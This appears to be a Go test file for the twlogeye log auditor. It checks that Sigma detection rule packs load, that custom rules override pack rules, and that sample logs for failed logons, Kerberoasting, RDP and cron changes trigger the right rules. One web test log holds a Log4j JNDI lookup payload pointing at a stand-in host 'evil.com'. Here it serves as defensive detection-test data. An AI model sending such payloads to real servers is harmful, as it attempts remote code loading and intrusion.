package auditor

import (
	"os"
	"path/filepath"
	"testing"
	"time"

	"github.com/twsnmp/twlogeye/datastore"
)

func TestAvailableSigmaPacks(t *testing.T) {
	packs := datastore.GetAvailableSigmaPacks()
	if len(packs) < 7 {
		t.Fatalf("expected at least 7 available packs, got %d: %v", len(packs), packs)
	}
	expected := []string{
		"windows-essential",
		"windows-ad",
		"windows-client",
		"linux-auth",
		"linux-system",
		"network-threats",
		"web-attacks",
	}
	packMap := make(map[string]bool)
	for _, p := range packs {
		packMap[p] = true
	}
	for _, exp := range expected {
		if !packMap[exp] {
			t.Errorf("expected pack %s not found in %v", exp, packs)
		}
	}
}

func TestSigmaPacksLoadingAndMatching(t *testing.T) {
	datastore.Config.SigmaPacks = []string{"windows-essential", "linux-auth"}
	datastore.Config.SigmaRules = "none" // do not load default embed

	entries := GetSigmaRuleEntries()
	if len(entries) < 10 {
		t.Fatalf("expected at least 10 rules loaded from packs, got %d", len(entries))
	}

	for _, e := range entries {
		if e.Source != "pack:windows-essential" && e.Source != "pack:linux-auth" {
			t.Errorf("unexpected source for pack rule: %s", e.Source)
		}
	}

	// Test Windows Event 4625 matching
	winLog := `{"Event":{"System":{"Channel":"Security","Computer":"WIN-DC","EventID":4625,"Level":0},"EventData":{"TargetUserName":"admin","WorkstationName":"DESKTOP-1" karma}}}`
	// Use well-formed JSON
	winLog = `{"Event":{"System":{"Channel":"Security","Computer":"WIN-DC","EventID":4625,"Level":0},"EventData":{"TargetUserName":"admin","WorkstationName":"DESKTOP-1"}}}`
	lWin := &datastore.LogEnt{
		Time: time.Now().UnixNano(),
		Type: datastore.WindowsEventLog,
		Src:  "Security",
		Log:  winLog,
	}

	matchedWin := matchSigmaRule(lWin)
	if matchedWin == nil {
		t.Errorf("expected Windows 4625 rule to match, got nil")
	} else if matchedWin.ID != "018d9f10-ff31-419b-a36c-941cbfa0451a" {
		t.Errorf("expected rule ID 018d9f10-ff31-419b-a36c-941cbfa0451a, got %s", matchedWin.ID)
	}

	// Test Linux SSH failed login matching
	linuxLog := `{"hostname":"server1","content":"Failed password for invalid user admin from 192.168.1.100 port 45678 ssh2"}`
	lLinux := &datastore.LogEnt{
		Time: time.Now().UnixNano(),
		Type: datastore.Syslog,
		Src:  "server1",
		Log:  linuxLog,
	}

	matchedLinux := matchSigmaRule(lLinux)
	if matchedLinux == nil {
		t.Errorf("expected Linux SSH failed login rule to match, got nil")
	}
}

func TestAllSigmaPacksMatching(t *testing.T) {
	datastore.Config.SigmaPacks = []string{
		"windows-essential",
		"windows-ad",
		"windows-client",
		"linux-auth",
		"linux-system",
		"network-threats",
		"web-attacks",
	}
	datastore.Config.SigmaRules = "none"

	entries := GetSigmaRuleEntries()
	if len(entries) < 45 {
		t.Fatalf("expected at least 45 rules across 7 packs, got %d", len(entries))
	}

	// 1. Web Log4j test
	webLog := `{"hostname":"web01","content":"GET /index.jsp?user=${jndi:ldap://evil.com/a} HTTP/1.1"}`
	if m := matchSigmaRule(&datastore.LogEnt{Time: time.Now().UnixNano(), Type: datastore.Syslog, Src: "web01", Log: webLog}); m == nil || m.ID != "56934c95-b049-4179-8a48-433e53664ec5" {
		t.Errorf("expected Log4j rule match, got %v", m)
	}

	// 2. Network FortiGate VPN test
	netLog := `{"hostname":"fortigate","content":"date=2026-09-09 type=event subtype=vpn msg=\"SSL VPN login fail\" action=ssl-login-fail"}`
	if m := matchSigmaRule(&datastore.LogEnt{Time: time.Now().UnixNano(), Type: datastore.Syslog, Src: "fortigate", Log: netLog}); m == nil || m.ID != "a742880c-55c3-4d69-b570-5b65f7c32014" {
		t.Errorf("expected FortiGate VPN rule match, got %v", m)
	}

	// 3. Windows AD Kerberoasting test
	adLog := `{"Event":{"System":{"EventID":4769},"EventData":{"TicketEncryptionType":"0x17"}}}`
	if m := matchSigmaRule(&datastore.LogEnt{Time: time.Now().UnixNano(), Type: datastore.WindowsEventLog, Src: "Security", Log: adLog}); m == nil || m.ID != "5cb638a1-e01d-407a-9a99-4d64ea1c8c88" {
		t.Errorf("expected Kerberoasting rule match, got %v", m)
	}

	// 4. Windows Client RDP Logon test
	rdpLog := `{"Event":{"System":{"EventID":4624},"EventData":{"LogonType":10}}}`
	if m := matchSigmaRule(&datastore.LogEnt{Time: time.Now().UnixNano(), Type: datastore.WindowsEventLog, Src: "Security", Log: rdpLog}); m == nil || m.ID != "b449ca2e-335e-4bb5-a392-5b9679f228b1" {
		t.Errorf("expected RDP Logon rule match, got %v", m)
	}

	// 5. Linux System Cron test
	cronLog := `{"hostname":"srv01","content":"crontab[1234]: (root) REPLACE (root)"}`
	if m := matchSigmaRule(&datastore.LogEnt{Time: time.Now().UnixNano(), Type: datastore.Syslog, Src: "srv01", Log: cronLog}); m == nil || m.ID != "f45691ea-2719-4822-ba35-ef05b827e801" {
		t.Errorf("expected Cron rule match, got %v", m)
	}
}

func TestSigmaOverridePriority(t *testing.T) {
	// Create temporary custom rule with same ID as win_security_failed_logons but different level and title
	tmpDir, err := os.MkdirTemp("", "sigma_test_*")
	if err != nil {
		t.Fatal(err)
	}
	defer os.RemoveAll(tmpDir)

	customRule := `title: Customized Failed Logon
id: 018d9f10-ff31-419b-a36c-941cbfa0451a
status: stable
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4625
    condition: selection
level: critical
`
	ruleFile := filepath.Join(tmpDir, "custom.yaml")
	if err := os.WriteFile(ruleFile, []byte(customRule), 0644); err != nil {
		t.Fatal(err)
	}

	datastore.Config.SigmaPacks = []string{"windows-essential"}
	datastore.Config.SigmaRules = tmpDir

	entries := GetSigmaRuleEntries()
	var overriddenEntry *SigmaRuleEntry
	for _, e := range entries {
		if e.Evaluator.ID == "018d9f10-ff31-419b-a36c-941cbfa0451a" {
			overriddenEntry = e
			break
		}
	}

	if overriddenEntry == nil {
		t.Fatalf("rule 018d9f10-ff31-419b-a36c-941cbfa0451a not found")
	}
	if overriddenEntry.Source != "file:"+ruleFile {
		t.Errorf("expected source file:%s, got %s", ruleFile, overriddenEntry.Source)
	}
	if overriddenEntry.Evaluator.Level != "critical" {
		t.Errorf("expected level critical, got %s", overriddenEntry.Evaluator.Level)
	}
	if overriddenEntry.Evaluator.Title != "Customized Failed Logon" {
		t.Errorf("expected title Customized Failed Logon, got %s", overriddenEntry.Evaluator.Title)
	}
}
